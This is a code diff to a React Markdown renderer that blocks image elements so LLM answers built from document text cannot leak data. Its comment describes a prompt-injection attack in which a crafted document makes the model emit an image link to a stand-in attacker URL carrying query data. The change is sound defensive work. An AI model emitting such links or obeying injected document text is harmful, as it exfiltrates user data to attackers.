@@ -12,6 +12,11 @@ export interface MarkdownProps {
   activeCite?: string | null;
 }
 
+// Answers come from an LLM fed with document text, so a crafted document could make it emit
+// ![](https://attacker/?q=...) and leak data via an image fetch. Images are never rendered, and raw
+// HTML stays escaped (no rehype-raw).
+const DISALLOWED = ["img"];
+
 /** Markdown renderer. When `citations` is given, [S#] markers render as interactive chips. */
 export const Markdown = memo(function Markdown({ content, citations, onCite, activeCite }: MarkdownProps) {
   const withCites = citations !== undefined;
@@ -30,7 +35,7 @@ export const Markdown = memo(function Markdown({ content, citations, onCite, act
   };
   return (
     <div className="prose-doc">
-      <ReactMarkdown remarkPlugins={[remarkGfm]} components={components}>
+      <ReactMarkdown remarkPlugins={[remarkGfm]} components={components} disallowedElements={DISALLOWED}>
         {withCites ? linkifyCitations(content) : content}
       </ReactMarkdown>
     </div>
